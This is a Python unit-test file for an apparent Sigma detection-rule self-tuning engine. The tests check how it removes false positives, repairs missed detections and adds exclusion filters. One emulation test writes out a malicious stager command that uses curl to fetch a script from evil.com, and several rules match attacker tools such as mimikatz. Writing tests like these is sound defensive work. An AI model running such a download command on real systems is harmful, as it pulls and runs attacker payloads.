"""Unit tests for the autonomous Detection Self-Tuning Engine (Milestone 3)."""

from hecate_agent.core.emulation_runner import EmulationRunner, MockBackend
from hecate_agent.core.sigma_self_tuner import SigmaSelfTuner


def test_self_tuner_already_perfect() -> None:
    perfect_rule = """
title: Precise Malware Execution
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|contains: 'specific_threat_payload.exe'
    condition: selection
"""
    intrusions = [
        {"category": "process_creation", "CommandLine": "cmd.exe /c specific_threat_payload.exe", "Image": "cmd.exe"},
    ]
    baselines = [
        {"category": "process_creation", "CommandLine": "cmd.exe /c dir", "Image": "cmd.exe"},
        {"category": "process_creation", "CommandLine": "notepad.exe", "Image": "notepad.exe"},
    ]

    tuner = SigmaSelfTuner(max_iterations=3)
    report = tuner.tune(perfect_rule, intrusions, baselines)

    assert report.converged is True
    assert report.total_iterations == 0
    assert report.is_perfect is True
    assert "CONVERGED" in report.summary()


def test_self_tuner_false_positive_elimination() -> None:
    broad_rule = """
title: Broad Svchost Detection
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|contains: 'svchost'
    condition: selection
"""
    intrusions = [
        {"category": "process_creation", "CommandLine": "malware.exe -target svchost.exe", "Image": "C:\\temp\\malware.exe"},
    ]
    baselines = [
        {
            "category": "process_creation",
            "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
            "Image": "C:\\Windows\\System32\\svchost.exe",
        },
    ]

    tuner = SigmaSelfTuner(max_iterations=3)
    report = tuner.tune(broad_rule, intrusions, baselines)

    assert report.initial_metrics.false_positives == 1
    assert report.final_metrics.false_positives == 0
    assert report.final_metrics.true_positives == 1
    assert report.converged is True
    assert report.is_perfect is True
    assert report.precision_improved is True
    assert "filter_legitimate" in report.final_rule
    assert "not filter_legitimate" in report.final_rule


def test_self_tuner_false_negative_repair() -> None:
    narrow_rule = """
title: Specific Stager Detection
logsource:
    category: process_creation
detection:
    selection:
        Image: 'C:\\Windows\\System32\\cmd.exe'
        CommandLine|contains: 'stager'
    condition: selection
"""
    # Adversary actually executed using powershell.exe instead of cmd.exe
    intrusions = [
        {
            "category": "process_creation",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell -c run_stager.ps1",
        },
    ]
    baselines = [
        {"category": "process_creation", "Image": "C:\\Windows\\explorer.exe", "CommandLine": "explorer.exe"},
    ]

    tuner = SigmaSelfTuner(max_iterations=3)
    report = tuner.tune(narrow_rule, intrusions, baselines)

    assert report.initial_metrics.false_negatives == 1
    assert report.final_metrics.false_negatives == 0
    assert report.final_metrics.true_positives == 1
    assert report.converged is True
    assert report.recall_improved is True


def test_self_tuner_tune_emulation_integration() -> None:
    broad_rule = """
title: Curl Stager Execution
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|contains: 'curl'
    condition: selection
"""
    # Emulation runner harvests a malicious curl stager
    mock_events = [
        {"category": "process_creation", "CommandLine": "curl -s http://evil.com/payload.sh", "Image": "/tmp/curl_malware"},
    ]
    runner = EmulationRunner(backend=MockBackend(mock_events=mock_events))
    emulation_res = runner.run_command("curl -s http://evil.com/payload.sh")

    # Baseline has a legitimate system curl from package updater
    baselines = [
        {"category": "process_creation", "CommandLine": "curl -s https://repo.ubuntu.com", "Image": "/usr/bin/curl"},
    ]

    tuner = SigmaSelfTuner(max_iterations=3)
    report = tuner.tune_emulation(broad_rule, emulation_res, baselines)

    assert report.initial_metrics.false_positives == 1
    assert report.final_metrics.false_positives == 0
    assert report.final_metrics.true_positives == 1
    assert report.converged is True
    assert "filter_legitimate" in report.final_rule


def test_self_tuner_never_filters_intrusion_attributes() -> None:
    rule = """
title: Common Binary Rule
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|contains: 'whoami'
    condition: selection
"""
    # Both intrusion and baseline share Image: /usr/bin/whoami, but have different users
    intrusions = [
        {"category": "process_creation", "CommandLine": "whoami", "Image": "/usr/bin/whoami", "User": "attacker"},
    ]
    baselines = [
        {"category": "process_creation", "CommandLine": "whoami", "Image": "/usr/bin/whoami", "User": "root"},
    ]

    tuner = SigmaSelfTuner(max_iterations=3)
    report = tuner.tune(rule, intrusions, baselines)

    # Tuner should filter User: root, NOT Image: /usr/bin/whoami (which would drop the attack)
    assert report.converged is True
    assert "User" in report.final_rule
    assert "attacker" not in report.final_rule  # Attack user is not filtered
    assert report.final_metrics.true_positives == 1
    assert report.final_metrics.false_positives == 0


def test_tune_rule_compound_exclude_with_parent() -> None:
    rule = """title: Cmd Execution
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\\cmd.exe'
    condition: selection
"""
    tuner = SigmaSelfTuner()
    updated_yaml, summary = tuner.tune_rule(rule, "exclude svchost.exe with parent services.exe")

    assert "filter_svchost_services" in updated_yaml
    assert "Image|endswith: \\svchost.exe" in updated_yaml
    assert "ParentImage|endswith: \\services.exe" in updated_yaml
    assert "condition: (selection) and not filter_svchost_services" in updated_yaml
    assert "Added exclusion filter `filter_svchost_services`" in summary


def test_tune_rule_filter_path() -> None:
    rule = """title: Suspicious Tool
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|contains: 'mimikatz'
    condition: selection
"""
    tuner = SigmaSelfTuner()
    updated_yaml, summary = tuner.tune_rule(rule, "filter path C:\\Program Files\\AdminTools")

    assert "filter_admintools" in updated_yaml
    assert "Image|startswith: C:\\Program Files\\AdminTools" in updated_yaml
    assert "condition: (selection) and not filter_admintools" in updated_yaml
    assert "Added exclusion filter `filter_admintools`" in summary


def test_tune_rule_filter_commandline_containing() -> None:
    rule = """title: Broad Script
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\\powershell.exe'
    condition: selection
"""
    tuner = SigmaSelfTuner()
    updated_yaml, summary = tuner.tune_rule(rule, "filter out CommandLine containing /update")

    assert "filter_update" in updated_yaml
    assert "CommandLine|contains: /update" in updated_yaml
    assert "condition: (selection) and not filter_update" in updated_yaml
    assert "Added exclusion filter `filter_update`" in summary


def test_tune_rule_broaden_inclusion() -> None:
    rule = """title: Shell Execution
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\\cmd.exe'
    condition: selection
"""
    tuner = SigmaSelfTuner()
    updated_yaml, summary = tuner.tune_rule(rule, "broaden Image to include pwsh.exe")

    assert "pwsh.exe" in updated_yaml
    assert "\\cmd.exe" in updated_yaml
    assert "Expanded `Image|endswith` with `pwsh.exe`" in summary


def test_tune_sigma_rule_api() -> None:
    from hecate_agent.api import tune_sigma_rule

    rule = """title: API Test Rule
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith: '\\cmd.exe'
    condition: selection
"""
    new_yaml, summary = tune_sigma_rule(rule, "@hecate tune exclude svchost.exe with parent services.exe")
    assert "filter_svchost_services" in new_yaml
    assert "services.exe" in new_yaml
    assert "Added exclusion filter" in summary
